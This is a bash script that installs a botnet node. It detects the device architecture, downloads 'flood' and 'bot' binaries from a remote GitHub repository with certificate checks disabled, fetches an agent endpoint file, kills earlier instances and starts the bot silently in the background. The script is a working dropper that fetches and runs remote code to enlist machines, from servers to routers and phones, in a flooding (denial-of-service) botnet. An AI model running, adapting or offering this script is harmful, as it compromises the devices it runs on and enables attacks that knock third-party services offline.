#!/usr/bin/env bash
# ==============================================================================
# Setup Bots v2 — Fully-static flood for ALL devices (musl, TLS enabled)
# No glibc/GLIBCXX dependency — runs on Ubuntu, Debian, Alpine, OpenWrt, Termux, etc.
# ==============================================================================
set -e

REPO_BASE="https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main"
TARGET_DIR="${HOME}/.botv2"

echo "=================================================="
echo "         Initializing Bot v2 Setup                "
echo "=================================================="

ARCH=$(uname -m 2>/dev/null || echo "x86_64")
echo "[*] Architecture: ${ARCH}"

case "${ARCH}" in
    x86_64|amd64)      BIN_ARCH="x86_64" ;;
    aarch64|arm64)     BIN_ARCH="aarch64" ;;
    arm*|armv7*|armhf) BIN_ARCH="armv7l" ;;
    i*86|x86)          BIN_ARCH="x86" ;;
    *)                 BIN_ARCH="x86_64" ;;
esac

mkdir -p "${TARGET_DIR}"
cd "${TARGET_DIR}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PARENT_DIR="$(dirname "${SCRIPT_DIR}")"

download_file() {
    URL="$1"
    DEST="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -s -k -L "${URL}?t=$(date +%s)" -o "${DEST}"
    elif command -v wget >/dev/null 2>&1; then
        wget -q --no-check-certificate "${URL}?t=$(date +%s)" -O "${DEST}"
    else
        return 1
    fi
}

# ---- flood: prefer static binary for current arch ----
FLOOD_OK=0
# 1. Local static flood for this arch
if [ -f "${PARENT_DIR}/methods_cpp/flood-${BIN_ARCH}" ]; then
    echo "[*] Copying local static flood (${BIN_ARCH})..."
    cp "${PARENT_DIR}/methods_cpp/flood-${BIN_ARCH}" "./flood"
    chmod +x "./flood"
    FLOOD_OK=1
fi

# 2. Remote static flood for this arch
if [ "${FLOOD_OK}" -eq 0 ]; then
    echo "[*] Downloading static flood (${BIN_ARCH})..."
    if download_file "${REPO_BASE}/methods_cpp/flood-${BIN_ARCH}" "./flood" && [ -s "./flood" ]; then
        chmod +x "./flood"
        FLOOD_OK=1
    fi
fi

# 3. Fallback: local plain flood
if [ "${FLOOD_OK}" -eq 0 ] && [ -f "${PARENT_DIR}/methods_cpp/flood" ]; then
    echo "[!] Static flood not found, using local flood binary..."
    cp "${PARENT_DIR}/methods_cpp/flood" "./flood"
    chmod +x "./flood"
    FLOOD_OK=1
fi

# 4. Fallback: generic remote flood
if [ "${FLOOD_OK}" -eq 0 ]; then
    echo "[!] Downloading generic flood fallback..."
    download_file "${REPO_BASE}/bots/flood" "./flood" && chmod +x "./flood"
fi

# ---- bot binary (static, arch-specific) ----
if [ -f "${PARENT_DIR}/bots/bot-${BIN_ARCH}" ]; then
    cp "${PARENT_DIR}/bots/bot-${BIN_ARCH}" "./bot"
    chmod +x "./bot"
elif [ -f "${PARENT_DIR}/bots/bot" ]; then
    cp "${PARENT_DIR}/bots/bot" "./bot"
    chmod +x "./bot"
elif command -v curl >/dev/null 2>&1 || command -v wget >/dev/null 2>&1; then
    echo "[*] Downloading bot worker..."
    if download_file "${REPO_BASE}/bots/bot-${BIN_ARCH}" "./bot" && [ -s "./bot" ]; then
        chmod +x "./bot"
    else
        download_file "${REPO_BASE}/bots/bot" "./bot" && chmod +x "./bot"
    fi
fi

# ---- agent.txt (agent endpoint) ----
if [ -f "${PARENT_DIR}/agent.txt" ]; then
    cp "${PARENT_DIR}/agent.txt" "./agent.txt"
else
    download_file "${REPO_BASE}/agent.txt" "./agent.txt" || true
fi

chmod +x ./bot ./flood 2>/dev/null || true

if [ ! -x ./flood ]; then
    echo "[!] flood binary could not be obtained. Aborting."
    exit 1
fi
if [ ! -x ./bot ]; then
    echo "[!] bot binary could not be obtained. Aborting."
    exit 1
fi

# Kill old instances
pkill -f "./bot" 2>/dev/null || true

echo "[+] Starting bot v2 in background..."
nohup ./bot >/dev/null 2>&1 &
BOT_PID=$!
echo "[+] Bot v2 running with PID: ${BOT_PID}"

echo "=================================================="
echo "         Bot v2 Setup Complete & Active           "
echo "=================================================="